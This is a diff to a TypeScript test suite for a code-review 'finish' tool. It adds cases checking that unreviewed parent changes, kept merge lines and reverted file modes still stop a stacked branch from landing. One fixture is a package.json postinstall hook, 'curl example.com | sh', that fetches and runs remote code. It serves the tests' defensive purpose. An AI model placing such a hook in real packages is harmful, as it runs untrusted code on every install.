@@ -77,7 +77,7 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     expect(f.git('diff', '--quiet', 'origin/main', 'HEAD', '--', 'docs/policy.md', 'test/helpers/data.ts', 'test/land.test.ts', 'README.md').status).toBe(0);
     const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
     expect(lineOf(r.stdout, 'REVIEWED_BASE')).toBe(`REVIEWED_BASE: stack parent ${parent.slice(0, 12)} landed on origin/main at ${f.git('rev-parse', 'origin/main~1').stdout.trim().slice(0, 12)}`);
-    expect(lineOf(r.stdout, 'ROUTE')).toMatch(/ behavior=0 docs=0 metadata=0 tests=0 base=5 context=0$/);
+    expect(lineOf(r.stdout, 'ROUTE')).toMatch(/ behavior=0 docs=0 metadata=0 tests=0 base=6 context=0$/);
     expect(lineOf(r.stdout, 'DOCS')).toBe('DOCS: fresh against the Step 14.5 post-audit snapshot (carried: tests=1 base=4 requested=0)');
     expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([0, '']);
   });
@@ -102,8 +102,51 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
       },
     });
     expect(f.git('cat-file', '-e', 'origin/main:changelog.d/parent.md').status).not.toBe(0);
+    const resurrected = finish(f, reviewed, post, ['--reviewed-base', parent]);
+    expect([resurrected.status, lineOf(resurrected.stdout, 'STOP')]).toEqual([3, expect.stringContaining('authored docs changed since review (changelog.d/parent.md)')]);
+    expect(f.git('rm', '-q', 'changelog.d/parent.md').status).toBe(0);
+    f.commit('drop the parent\'s fragment the merge kept');
     const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
     expect([r.status, lineOf(r.stdout, 'STOP'), lineOf(r.stdout, 'REVIEWED_BASE')]).toEqual([0, '', expect.stringContaining(`stack parent ${parent.slice(0, 12)} landed on origin/main`)]);
+  });
+
+  // Value: protects=a parent change main never received in a path the child did not touch since review (a package.json
+  //   postinstall), and a merge that kept a parent line main fixed since, still stop: the route reads every path the branch
+  //   ships against main, not only paths changed since review (outside voice on #4013); fails_when=finish reads only the
+  //   reviewed-vs-current paths, or classifies the manifest as release metadata against the reviewed tree; seam=route
+  test('an unlanded parent change, or a merge that kept a line main changed, still stops', () => {
+    const PKG = '{"name":"fx","version":"1.0.0"}\n';
+    const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
+    const unlanded = stacked({
+      parentFiles: { ...PARENT, 'package.json': POSTINSTALL },
+      afterLand: g => g.advanceBase({ 'package.json': PKG }),
+    });
+    expect(unlanded.f.git('show', 'HEAD:package.json').stdout).toBe(POSTINSTALL);
+    const u = finish(unlanded.f, unlanded.reviewed, unlanded.post, ['--reviewed-base', unlanded.parent]);
+    expect([u.status, lineOf(u.stdout, 'STOP')]).toEqual([3, behaviorStop('package.json')]);
+    const kept = stacked({ mainLater: { ...MAIN_LATER, 'src/shared.ts': lines(20, { 3: 'export const l3 = 31;' }) } });
+    expect(kept.f.git('checkout', '-q', kept.passHead, '--', 'src/shared.ts').status).toBe(0);
+    kept.f.commit('keep the parent line');
+    const k = finish(kept.f, kept.reviewed, kept.post, ['--reviewed-base', kept.parent]);
+    expect([k.status, lineOf(k.stdout, 'STOP')]).toEqual([3, behaviorStop('src/shared.ts')]);
+  });
+
+  // Value: protects=a reviewed executable bit reverted to main's mode after review is not held by main, so it stops
+  //   (outside voice on #4013); fails_when=baseHolds compares blob bytes only; seam=lib/ship-patch.ts baseHolds
+  test('a reverted mode change stops', () => {
+    let exec = '';
+    const { f, parent, post } = stacked({ base: { ...BASE, 'bin/run.sh': '#!/bin/sh\necho run\n' }, beforeMerge: g => {
+      expect(g.git('update-index', '--chmod=+x', 'bin/run.sh').status).toBe(0);
+      expect(g.git('commit', '-qm', 'make it executable').status).toBe(0);
+      expect(g.git('checkout', '--', 'bin/run.sh').status).toBe(0);
+      exec = g.git('rev-parse', 'HEAD^{tree}').stdout.trim();
+    } });
+    expect(f.git('update-index', '--chmod=-x', 'bin/run.sh').status).toBe(0);
+    expect(f.git('commit', '-qm', 'drop the executable bit').status).toBe(0);
+    expect(f.git('checkout', '--', 'bin/run.sh').status).toBe(0);
+    expect(f.git('diff', '--quiet', 'origin/main', 'HEAD', '--', 'bin/run.sh').status).toBe(0);
+    const r = finish(f, exec, post, ['--reviewed-base', parent]);
+    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('bin/run.sh')]);
   });
 
   // Value: protects=negative control: a child edit after the review still stops with the landed parent as the base;
@@ -124,7 +167,7 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     mergeMain(absorbed.f);
     expect(absorbed.f.git('diff', '--quiet', 'origin/main', 'HEAD', '--', 'src/shared.ts').status).toBe(0);
     const a = finish(absorbed.f, absorbed.reviewed, absorbed.post, ['--reviewed-base', absorbed.parent]);
-    expect([a.status, lineOf(a.stdout, 'ROUTE')]).toEqual([0, expect.stringMatching(/ behavior=0 docs=0 metadata=0 tests=0 base=5 context=0$/)]);
+    expect([a.status, lineOf(a.stdout, 'ROUTE')]).toEqual([0, expect.stringMatching(/ behavior=0 docs=0 metadata=0 tests=0 base=6 context=0$/)]);
     const reverted = stacked();
     reverted.f.write({ 'src/shared.ts': MAIN_LATER['src/shared.ts'] }); reverted.f.commit('revert the reviewed hunk');
     const v = finish(reverted.f, reverted.reviewed, reverted.post, ['--reviewed-base', reverted.parent]);
@@ -160,7 +203,7 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     });
     const r = finish(s.f, s.reviewed, s.post, ['--reviewed-base', s.parent]);
     expect(lineOf(r.stdout, 'FIX_CHECK')).toStartWith(`FIX_CHECK: reviewed src/shared.ts (fix-check at ${fixHead.slice(0, 12)}, range from ${passHead.slice(0, 12)}`);
-    expect([r.status, lineOf(r.stdout, 'ROUTE')]).toEqual([0, expect.stringMatching(/ behavior=0 docs=0 metadata=0 tests=0 base=4 context=0 fix_checked=1$/)]);
+    expect([r.status, lineOf(r.stdout, 'ROUTE')]).toEqual([0, expect.stringMatching(/ behavior=0 docs=0 metadata=0 tests=0 base=5 context=0 fix_checked=1$/)]);
   });
 });
 
